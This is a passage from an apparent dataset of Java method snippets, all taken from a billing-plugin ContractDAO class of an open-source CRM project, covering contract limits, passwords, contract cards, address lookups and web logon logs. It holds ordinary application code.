LimitLogItem();\n                    logItem.setTime(TimeUtils.parse(item.getAttribute(\"f0\"), TimeUtils.PATTERN_DDMMYYYYHHMMSS));\n                    logItem.setUser(item.getAttribute(\"f1\"));\n                    logItem.setLimit(Utils.parseBigDecimal(item.getAttribute(\"f2\")));\n                    logItem.setComment(item.getAttribute(\"comment\"));\n                    logItem.setDays(item.getAttribute(\"days\"));\n\n                    log.getList().add(logItem);\n                }\n            }\n        }\n\n        if (taskList != null) {\n            for (Element item : XMLUtils.selectElements(doc, \"/data/table_lp/data/row\")) {\n                LimitChangeTask task = new LimitChangeTask();\n                task.setId(Utils.parseInt(item.getAttribute(\"id\")));\n                task.setDate(TimeUtils.parse(item.getAttribute(\"f0\"), TimeUtils.PATTERN_DDMMYYYY));\n                task.setUser(item.getAttribute(\"f1\"));\n                task.setLimitChange(Utils.parseBigDecimal(item.getAttribute(\"f2\")));\n\n                taskList.add(task);\n            }\n        }\n\n        return result;\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/dao/ContractDAO.java", "stars": "12", "class_props": {"extends": "BillingDAO", "implements": null, "modifiers": ["public"]}}, {"id": 57381, "method_name": "updateLimit", "class_name": "ContractDAO", "params": ["int", "BigDecimal", "int", "String"], "throws": ["BGException"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void updateLimit(int contractId, BigDecimal limit, int days, String comment) throws BGException {\n        if (days > 0) {\n            if (dbInfo.getVersion().compareTo(\"6.2\") >= 0) {\n                RequestJsonRpc req = new RequestJsonRpc(\"ru.bitel.bgbilling.kernel.contract.limit\", \"ContractLimitService\",\n                        \"updateContractLimitPeriod\");\n                req.setParamContractId(contractId);\n                req.setParam(\"limit\", limit);\n                req.setParam(\"period\", days);\n                req.setParam(\"comment\", comment);\n                transferData.postData(req, user);\n            } else {\n                Request request = new Request();\n                request.setModule(CONTRACT_MODULE_ID);\n                request.setContractId(contractId);\n                request.setAttribute(\"comment\", comment);\n                request.setAction(\"UpdateContractLimitPeriod\");\n                request.setAttribute(\"limit\", limit.toPlainString());\n                request.setAttribute(\"period\", days);\n                transferData.postData(request, user);\n            }\n        } else {\n            Request request = new Request();\n            request.setModule(CONTRACT_MODULE_ID);\n            request.setContractId(contractId);\n            request.setAttribute(\"comment\", comment);\n            request.setAction(\"UpdateContractLimit\");\n            request.setAttribute(\"value\", limit.toPlainString());\n            transferData.postData(request, user);\n        }\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/dao/ContractDAO.java", "stars": "12", "class_props": {"extends": "BillingDAO", "implements": null, "modifiers": ["public"]}}, {"id": 57382, "method_name": "deleteLimitTask", "class_name": "ContractDAO", "params": ["int", "int"], "throws": ["BGException"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void deleteLimitTask(int contractId, int id) throws BGException {\n        Request request = new Request();\n        request.setModule(CONTRACT_MODULE_ID);\n        request.setAction(\"LimitChangeTaskDelete\");\n        request.setContractId(contractId);\n        request.setAttribute(\"id\", id);\n\n        transferData.postData(request, user);\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/dao/ContractDAO.java", "stars": "12", "class_props": {"extends": "BillingDAO", "implements": null, "modifiers": ["public"]}}, {"id": 57383, "method_name": "getContractStatisticPassword", "class_name": "ContractDAO", "params": ["int"], "throws": ["BGException"], "modifiers": ["public"], "return_type": "String", "snippet": "    public String getContractStatisticPassword(int contractId) throws BGException {\n        Document contractCard = new ContractDAO(this.user, this.dbInfo).getContractCardDoc(contractId);\n        return XMLUtils.selectText(contractCard, \"/data/contract/@pswd\");\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/dao/ContractDAO.java", "stars": "12", "class_props": {"extends": "BillingDAO", "implements": null, "modifiers": ["public"]}}, {"id": 57384, "method_name": "getList", "class_name": "ContractDAO", "params": ["Element"], "throws": null, "modifiers": ["private"], "return_type": "List<IdTitle>", "snippet": "    private List<IdTitle> getList(Element node) {\n        List<IdTitle> result = Collections.emptyList();\n\n        if (node != null) {\n            result = new ArrayList<IdTitle>();\n            for (Element item : XMLUtils.selectElements(node, \"item\")) {\n                result.add(new IdTitle(Utils.parseInt(item.getAttribute(\"id\")), item.getAttribute(\"title\")));\n            }\n        }\n\n        return result;\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/dao/ContractDAO.java", "stars": "12", "class_props": {"extends": "BillingDAO", "implements": null, "modifiers": ["public"]}}, {"id": 57385, "method_name": "getContractAddress", "class_name": "ContractDAO", "params": ["int"], "throws": ["BGException"], "modifiers": ["public"], "return_type": "List<IdTitle>", "snippet": "    public List<IdTitle> getContractAddress(int contractId) throws BGException {\n        Request request = new Request();\n        request.setModule(CONTRACT_MODULE_ID);\n        request.setAction(\"ContractAddressList\");\n        request.setContractId(contractId);\n\n        Document document = transferData.postData(request, user);\n\n        List<IdTitle> contractAddress = new ArrayList<IdTitle>();\n        Element dataElement = document.getDocumentElement();\n        NodeList nodeList = dataElement.getElementsByTagName(\"item\");\n\n        for (int index = 0; index < nodeList.getLength(); index++) {\n            Element rowElement = (Element) nodeList.item(index);\n            IdTitle address = new IdTitle();\n            address.setId(Utils.parseInt(rowElement.getAttribute(\"id\")));\n            address.setTitle(rowElement.getAttribute(\"title\"));\n\n            contractAddress.add(address);\n        }\n\n        return contractAddress;\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/dao/ContractDAO.java", "stars": "12", "class_props": {"extends": "BillingDAO", "implements": null, "modifiers": ["public"]}}, {"id": 57386, "method_name": "getContractPassword", "class_name": "ContractDAO", "params": ["int"], "throws": ["BGException"], "modifiers": ["public"], "return_type": "String", "snippet": "    public String getContractPassword(int contractId) throws BGException {\n        Request billingRequest = new Request();\n        billingRequest.setModule(CONTRACT_MODULE_ID);\n        billingRequest.setAction(\"ContractPassword\");\n        billingRequest.setContractId(contractId);\n\n        Document document = transferData.postData(billingRequest, user);\n\n        Element rowElement = (Element) document.getElementsByTagName(\"table\").item(0);\n        String result = rowElement.getAttribute(\"password\");\n\n        return result;\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/dao/ContractDAO.java", "stars": "12", "class_props": {"extends": "BillingDAO", "implements": null, "modifiers": ["public"]}}, {"id": 57387, "method_name": "updateContractPassword", "class_name": "ContractDAO", "params": ["int", "String", "boolean"], "throws": ["BGException"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void updateContractPassword(int contractId, String value, boolean generate) throws BGException {\n        Request request = new Request();\n        request.setModule(CONTRACT_MODULE_ID);\n        request.setAction(\"UpdateContractPassword\");\n        request.setContractId(contractId);\n        request.setAttribute(\"value\", Utils.maskNull(value));\n\n        if (generate) {\n            request.setAttribute(\"set_pswd\", 1);\n        }\n\n        transferData.postData(request, user);\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/dao/ContractDAO.java", "stars": "12", "class_props": {"extends": "BillingDAO", "implements": null, "modifiers": ["public"]}}, {"id": 57388, "method_name": "getContractFullCard", "class_name": "ContractDAO", "params": ["int"], "throws": ["BGException"], "modifiers": ["public"], "return_type": "String", "snippet": "    public String getContractFullCard(int contractId) throws BGException {\n        Request req = new Request();\n\n        req.setModule(CONTRACT_MODULE_ID);\n        req.setAction(\"ContractCardXml\");\n        req.setAttribute(\"contentType\", \"html\");\n        req.setContractId(contractId);\n\n        return transferData.postDataGetString(req, user);\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/dao/ContractDAO.java", "stars": "12", "class_props": {"extends": "BillingDAO", "implements": null, "modifiers": ["public"]}}, {"id": 57389, "method_name": "getContractCardDoc", "class_name": "ContractDAO", "params": ["int"], "throws": ["BGException"], "modifiers": ["public"], "return_type": "Document", "snippet": "    public Document getContractCardDoc(int contractId) throws BGException {\n        Request req = new Request();\n\n        req.setModule(CONTRACT_MODULE_ID);\n        req.setAction(\"ContractCardXml\");\n        req.setAttribute(\"contentType\", \"xml\");\n        req.setContractId(contractId);\n\n        return transferData.postData(req, user);\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/dao/ContractDAO.java", "stars": "12", "class_props": {"extends": "BillingDAO", "implements": null, "modifiers": ["public"]}}, {"id": 57390, "method_name": "getContractCardTypes", "class_name": "ContractDAO", "params": ["int"], "throws": ["BGException"], "modifiers": ["public"], "return_type": "List<String>", "snippet": "    public List<String[]> getContractCardTypes(int contractId) throws BGException {\n        Request req = new Request();\n\n        req.setModule(CONTRACT_MODULE_ID);\n        req.setAction(\"ContractCard2ListTypes\");\n        req.setContractId(contractId);\n\n        List<String[]> result = new ArrayList<String[]>(3);\n\n        Document doc = transferData.postData(req, user);\n        for (Element el : XMLUtils.selectElements(doc, \"/data/combo/el\")) {\n            result.add(new String[] { el.getAttribute(\"id\"), el.getAttribute(\"title\") });\n        }\n\n        // TODO: \u0414\u043e\u0434\u0435\u043b\u0430\u0442\u044c \u0440\u0430\u0437\u0431\u043e\u0440 \u043e\u0442\u0432\u0435\u0442\u0430 \u0432\u0438\u0434\u0430:\n        // <data secret=\"0D7664EB8CE2FD197C77650D2FE54240\"\n        // status=\"ok\"><combo><el id=\"ufanet.card_inet.xsl\"\n        // title=\"\u041a\u0430\u0440\u0442\u0430 \u0440\u0435\u0433\u0438\u0441\u0442\u0440\u0430\u0446\u0438\u0438\"\n        // title_enc=\"0JrQsNGA0YLQsCDRgNC10LPQuNGB0YLRgNCw0YbQuNC4\"/></combo></data>\n\n        return result;\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/dao/ContractDAO.java", "stars": "12", "class_props": {"extends": "BillingDAO", "implements": null, "modifiers": ["public"]}}, {"id": 57391, "method_name": "getContractCard2Pdf", "class_name": "ContractDAO", "params": ["int", "String"], "throws": ["BGException"], "modifiers": ["public"], "return_type": "byte", "snippet": "    public byte[] getContractCard2Pdf(int contractId, String type) throws BGException {\n        Request req = new Request();\n\n        req.setModule(CONTRACT_MODULE_ID);\n        req.setAction(\"ContractCard2\");\n        req.setAttribute(\"contentType\", \"application/pdf\");\n        req.setContractId(contractId);\n        req.setAttribute(\"type\", type);\n\n        return transferData.postDataGetBytes(req, user);\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/dao/ContractDAO.java", "stars": "12", "class_props": {"extends": "BillingDAO", "implements": null, "modifiers": ["public"]}}, {"id": 57392, "method_name": "bgbillingOpenContract", "class_name": "ContractDAO", "params": ["int"], "throws": ["BGException"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void bgbillingOpenContract(int contractId) throws BGException {\n        Request req = new Request();\n\n        req.setModule(ADMIN_MODULE_ID);\n        req.setAction(\"Command\");\n        req.setAttribute(\"command\", \"put\");\n        req.setAttribute(\"value\", \"openContract:\" + contractId);\n\n        transferData.postData(req, user);\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/dao/ContractDAO.java", "stars": "12", "class_props": {"extends": "BillingDAO", "implements": null, "modifiers": ["public"]}}, {"id": 57393, "method_name": "bgbillingUpdateContractTitleAndComment", "class_name": "ContractDAO", "params": ["int", "String", "int"], "throws": ["BGException"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void bgbillingUpdateContractTitleAndComment(int contractId, String comment, int patid) throws BGException {\n        Request req = new Request();\n\n        req.setModule(CONTRACT_MODULE_ID);\n        req.setAction(\"UpdateContractTitleAndComment\");\n        req.setContractId(contractId);\n        if (patid > 0) {\n            req.setAttribute(\"patid\", patid);\n        }\n        req.setAttribute(\"comment\", comment);\n\n        transferData.postData(req, user);\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/dao/ContractDAO.java", "stars": "12", "class_props": {"extends": "BillingDAO", "implements": null, "modifiers": ["public"]}}, {"id": 57394, "method_name": "bgbillingGetContractPatternList", "class_name": "ContractDAO", "params": [], "throws": ["BGException"], "modifiers": ["public"], "return_type": "List<IdTitle>", "snippet": "    public List<IdTitle> bgbillingGetContractPatternList() throws BGException {\n        Request req = new Request();\n\n        req.setModule(CONTRACT_MODULE_ID);\n        req.setAction(\"GetPatternList\");\n\n        Document document = transferData.postData(req, user);\n\n        List<IdTitle> contractPatterns = new ArrayList<IdTitle>();\n        Element dataElement = document.getDocumentElement();\n        NodeList nodeList = dataElement.getElementsByTagName(\"item\");\n\n        for (int index = 0; index < nodeList.getLength(); index++) {\n            Element rowElement = (Element) nodeList.item(index);\n            IdTitle pattern = new IdTitle();\n            pattern.setId(Utils.parseInt(rowElement.getAttribute(\"id\")));\n            pattern.setTitle(rowElement.getAttribute(\"title\"));\n\n            contractPatterns.add(pattern);\n        }\n\n        return contractPatterns;\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/dao/ContractDAO.java", "stars": "12", "class_props": {"extends": "BillingDAO", "implements": null, "modifiers": ["public"]}}, {"id": 57395, "method_name": "setTariffPlan", "class_name": "ContractDAO", "params": ["int", "int", "int"], "throws": ["BGException"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void setTariffPlan(int contractId, int tariffId, int position) throws BGException {\n        new ContractTariffDAO(user, dbInfo).setTariffPlan(contractId, tariffId, position);\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/dao/ContractDAO.java", "stars": "12", "class_props": {"extends": "BillingDAO", "implements": null, "modifiers": ["public"]}}, {"id": 57396, "method_name": "getSubContracts", "class_name": "ContractDAO", "params": ["int"], "throws": ["BGException"], "modifiers": ["public"], "return_type": "List<Integer>", "snippet": "    public List<Integer> getSubContracts(int contractId) throws BGException {\n        return new ContractHierarchyDAO(user, dbInfo).getSubContracts(contractId);\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/dao/ContractDAO.java", "stars": "12", "class_props": {"extends": "BillingDAO", "implements": null, "modifiers": ["public"]}}, {"id": 57397, "method_name": "addSubcontract", "class_name": "ContractDAO", "params": ["int", "int"], "throws": ["BGException"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void addSubcontract(int superContractId, int subContractId) throws BGException {\n        new ContractHierarchyDAO(user, dbInfo).addSubcontract(superContractId, subContractId);\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/dao/ContractDAO.java", "stars": "12", "class_props": {"extends": "BillingDAO", "implements": null, "modifiers": ["public"]}}, {"id": 57398, "method_name": "getAdditionalActionList", "class_name": "ContractDAO", "params": ["int"], "throws": ["BGException"], "modifiers": ["public"], "return_type": "List<IdTitle>", "snippet": "    public List<IdTitle> getAdditionalActionList(int contractId) throws BGException {\n        return additionalActionList(contractId);\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/dao/ContractDAO.java", "stars": "12", "class_props": {"extends": "BillingDAO", "implements": null, "modifiers": ["public"]}}, {"id": 57399, "method_name": "getStreetsByCity", "class_name": "ContractDAO", "params": ["int"], "throws": ["BGException"], "modifiers": ["public"], "return_type": "List<IdTitle>", "snippet": "    public List<IdTitle> getStreetsByCity(int cityId) throws BGException {\n        Request request = new Request();\n        request.setModule(CONTRACT_MODULE_ID);\n        request.setAction(\"GetStreetsByCity\");\n\n        request.setAttribute(\"city\", cityId);\n\n        Document document = transferData.postData(request, user);\n\n        List<IdTitle> streets = new LinkedList<IdTitle>();\n\n        for (Element item : XMLUtils.selectElements(document, \"/data/streets/item\")) {\n            streets.add(new IdTitle(Utils.parseInt(item.getAttribute(\"id\")), item.getAttribute(\"title\")));\n        }\n\n        return streets;\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/dao/ContractDAO.java", "stars": "12", "class_props": {"extends": "BillingDAO", "implements": null, "modifiers": ["public"]}}, {"id": 57400, "method_name": "openContract", "class_name": "ContractDAO", "params": [], "throws": ["BGException"], "modifiers": ["public"], "return_type": "OpenContract", "snippet": "    public OpenContract openContract() throws BGException {\n        Request request = new Request();\n        request.setModule(CONTRACT_MODULE_ID);\n        request.setAction(\"OpenContract\");\n\n        Document document = transferData.postData(request, user);\n        return new OpenContract(document);\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/dao/ContractDAO.java", "stars": "12", "class_props": {"extends": "BillingDAO", "implements": null, "modifiers": ["public"]}}, {"id": 57401, "method_name": "getContractLimitManage", "class_name": "ContractDAO", "params": ["int"], "throws": ["BGException"], "modifiers": ["public"], "return_type": "int", "snippet": "    public int getContractLimitManage(int contractId) throws BGException {\n        Request billingRequest = new Request();\n        billingRequest.setModule(CONTRACT_MODULE_ID);\n        billingRequest.setAction(\"ContractLimitManage\");\n        billingRequest.setContractId(contractId);\n\n        Document document = transferData.postData(billingRequest, user);\n        Element rowElement = (Element) document.getElementsByTagName(\"table\").item(0);\n\n        return Utils.parseInt(rowElement.getAttribute(\"mode\"));\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/dao/ContractDAO.java", "stars": "12", "class_props": {"extends": "BillingDAO", "implements": null, "modifiers": ["public"]}}, {"id": 57402, "method_name": "updateContractLimitManage", "class_name": "ContractDAO", "params": ["int", "int"], "throws": ["BGException"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void updateContractLimitManage(int contractId, int mode) throws BGException {\n        Request billingRequest = new Request();\n        billingRequest.setModule(CONTRACT_MODULE_ID);\n        billingRequest.setAction(\"UpdateContractLimitManage\");\n        billingRequest.setContractId(contractId);\n        billingRequest.setAttribute(\"value\", mode);\n\n        transferData.postData(billingRequest, user);\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/dao/ContractDAO.java", "stars": "12", "class_props": {"extends": "BillingDAO", "implements": null, "modifiers": ["public"]}}, {"id": 57403, "method_name": "getWebContractLogonLog", "class_name": "ContractDAO", "params": ["SearchResult<WebContractLogonLogEntry>", "int", "WebContractLogonLogType", "Date", "Date"], "throws": ["BGException"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void getWebContractLogonLog(SearchResult<WebContractLogonLogEntry> searchResult, int contractId, WebContractLogonLogType type, Date date1,\n            Date date2) throws BGException {\n        Request request = new Request();\n        request.setModule(CONTRACT_MODULE_ID);\n        request.setAction(\"WebContractLogonLog\");\n        request.setContractId(contractId);\n        request.setAttribute(\"logType\", type.toString());\n\n        if (date1 != null) {\n            request.setAttribute(\"date1\", new SimpleDateFormat(\"dd.MM.yyyy\").format(date1));\n        }\n        if (date2 != null) {\n            request.setAttribute(\"date2\", new SimpleDateFormat(\"dd.MM.yyyy\").format(date2));\n        }\n\n        request.setAttribute(\"pageSize\", searchResult.getPage().getPageSize());\n        request.setAttribute(\"pageIndex\", searchResult.getPage().getPageIndex());\n\n        Document document = transferData.postData(request, user);\n\n        for (Element row : XMLUtils.selectElements(document, \"/data/table/data/row\")) {\n            switch (type) {\n            case OK: {\n                searchResult.getList().add(new WebContractLogonLogSuccess(row));\n                break;\n            }\n            case ERROR: {\n                searchResult.getList().add(new WebContractLogonLogError(row));\n                break;\n            }\n            default: {\n                throw new BGException(\"\u0423\u043a\u0430\u0437\u0430\u043d \u043d\u0435\u0438\u0437\u0432\u0435\u0441\u0442\u043d\u044b\u0439 \u0442\u0438\u043f \u043b\u043e\u0433\u043e\u0432: \" + type.toString());\n            }\n            }\n        }\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/dao/ContractDAO.java", "stars": "12", "class_props": {"extends": "BillingDAO", "implements": null, "modifiers": ["public"]}}, {"id": 57404, "method_name": "getWebRequestLimit", "class_name": "ContractDAO", "params": ["int"], "throws": ["BGException"], "modifiers": ["public"], "return_type": "WebRequestLimit", "snippet": "    public WebRequestLimit getWebRequestLimit(int contractId) throws BGException {\n        Request request = new Request();\n        request.setModule(CONTRACT_MODULE_ID);\n        request.setAction(\"WebRequestLimit\");\n        request.setContractId(contractId);\n\n        return new WebRequestLimit(transferData.postData(request, user));\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/dao/ContractDAO.java", "stars": "12", "class_props": {"extends": "BillingDAO", "implements": null, "modifiers": ["public"]}}, {"id": 57405, "method_name": "updateWebRequestLimit", "class_name": "ContractDAO", "params": ["int", "WebRequestLimitMode", "int"], "throws": ["BGException"], "modifiers": ["public"], "return_type": "WebRequestLimit", "snippet": "    public WebRequestLimit updateWebRequestLimit(int contractId, WebRequestLimitMode mode, int limit) throws BGException {\n        Request request = new Request();\n        request.setModule(CONTRACT_MODULE_ID);\n        request.setAction(\"WebRequestLimit\");\n        request.setContractId(contractId);\n        request.setAttribute(\"mode\", mode.getMode());\n\n        if (mode == WebRequestLimitMode.PERSONAL) {\n            request.setAttribute(\"limit\", limit);\n        }\n\n        return new WebRequestLimit(transferData.postData(request, user));\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/dao/ContractDAO.java", "stars": "12", "class_props": {"extends": "BillingDAO", "implements": null, "modifiers": ["public"]}}, {"id": 57406, "method_name": "getParameterList", "class_name": "ContractDAO", "params": ["int"], "throws": ["BGException"], "modifiers": ["public"], "return_type": "List<IdTitle>", "snippet": "    public List<IdTitle> getParameterList(int parameterTypeId) throws BGException {\n        List<IdTitle> paramList = null;\n        if (dbInfo.getVersion().compareTo(\"7.0\") >= 0) {\n            RequestJsonRpc req = new RequestJsonRpc(\"ru.bitel.bgbilling.kernel.contract.param\", \"ContractParameterService\",\n                    \"getContractParameterPrefList\");\n            req.setParam(\"paramType\", parameterTypeId);\n            JsonNode ret = transferData.postDataReturn(req, user);\n            paramList = readJsonValue(ret.traverse(), jsonTypeFactory.constructCollectionType(List.class, IdTitle.class));\n\n        } else {\n            Request req = new Request();\n            req.setModule(ADMIN_MODULE_ID);\n            req.setAction(\"ActionContractParameters\");\n            req.setAttribute(\"type\", parameterTypeId);\n            Document document = transferData.postData(req, user);\n            paramList = new ArrayList<>();\n            for (Element el : XMLUtils.selectElements(document, \"/data/table/data/row\")) {\n                paramList.add(new IdTitle(Utils.parseInt(el.getAttribute(\"id\")), el.getAttribute(\"title\")));\n            }\n        }\n        return paramList;\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/dao/ContractDAO.java", "stars": "12", "class_props": {"extends": "BillingDAO", "implements": null, "modifiers": ["public"]}}, {"id": 57407, "method_name": "getDate", "class_name": "WebContractLogonLogEntry", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Date", "snippet": "        public Date getDate() {\n            return date;\n        }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/dao/ContractDAO.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"id": 57408, "method_name": "setDate", "class_name": "WebContractLogonLogEntry", "params": ["Date"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "        public void setDate(Date date) {\n            this.date = date;\n        }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/dao/ContractDAO.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"id": 57409, "method_name": "getIp", "class_name": "WebContractLogonLogEntry", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "        public String getIp() {\n            return ip;\n        }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/dao/ContractDAO.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"id": 57410, "method_name": "setIp", "class_name": "WebContractLogonLogEntry", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "        public void setIp(String ip) {\n            this.ip = ip;\n        }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/dao/ContractDAO.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"id": 57411, "method_name": "getPasswordType", "class_name": "WebContractLogonLogSuccess", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "        public String getPasswordType() {\n            return passwordType;\n        }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/dao/ContractDAO.java", "stars": "12", "class_props": {"extends": "WebContractLogonLogEntry", "implements": null, "modifiers": ["public", "static"]}}, {"id": 57412, "method_name": "setPasswordType", "class_name": "WebContractLogonLogSuccess", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "        public void setPasswordType(String passwordType) {\n            this.passwordType = passwordType;\n        }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/dao/ContractDAO.java", "stars": "12", "class_props": {"extends": "WebContractLogonLogEntry", "implements": null, "modifiers": ["public", "static"]}}, {"id": 57413, "method_name": "getSessionId", "class_name": "WebContractLogonLogSuccess", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "        public String getSessionId() {\n            return sessionId;\n        }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/dao/ContractDAO.java", "stars": "12", "class_props": {"extends": "WebContractLogonLogEntry", "implements": null, "modifiers": ["public", "static"]}}, {"id": 57414, "method_name": "setSessionId", "class_name": "WebContractLogonLogSuccess", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "        public void setSessionId(String sessionId) {\n            this.sessionId = sessionId;\n        }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/dao/ContractDAO.java", "stars": "12", "class_props": {"extends": "WebContractLogonLogEntry", "implements": null, "modifiers": ["public", "static"]}}, {"id": 57415, "method_name": "getLogin", "class_name": "WebContractLogonLogError", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "        public String getLogin() {\n            return login;\n        }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/dao/ContractDAO.java", "stars": "12", "class_props": {"extends": "WebContractLogonLogEntry", "implements": null, "modifiers": ["public", "static"]}}, {"id": 57416, "method_name": "setLogin", "class_name": "WebContractLogonLogError", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "        public void setLogin(String login) {\n            this.login = login;\n        }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/dao/ContractDAO.java", "stars": "12", "class_props": {"extends": "WebContractLogonLogEntry", "implements": null, "modifiers": ["public", "static"]}}, {"id": 57417, "method_name": "getErrorCode", "class_name": "WebContractLogonLogError", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "        public String getErrorCode() {\n            return errorCode;\n        }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/dao/ContractDAO.java", "stars": "12", "class_props": {"extends": "WebContractLogonLogEntry", "implements": null, "modifiers": ["public", "static"]}}, {"id": 57418, "method_name": "setErrorCode", "class_name": "WebContractLogonLogError", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "        public void setErrorCode(String errorCode) {\n            this.errorCode = errorCode;\n        }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/dao/ContractDAO.java", "stars": "12", "class_props": {"extends": "WebContractLogonLogEntry", "implements": null, "modifiers": ["public", "static"]}}, {"id": 57419, "method_name": "getConfigLimit", "class_name": "WebLimit", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "        public int getConfigLimit() {\n            return configLimit;\n        }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/dao/ContractDAO.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"id": 57420, "method_name": "setConfigLimit", "class_name": "WebLimit", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "        public void setConfigLimit(int configLimit) {\n            this.configLimit = configLimit;\n        }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/dao/ContractDAO.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"id": 57421, "method_name": "getCount", "class_name": "WebLimit", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "        public int getCount() {\n            return count;\n        }", "url": 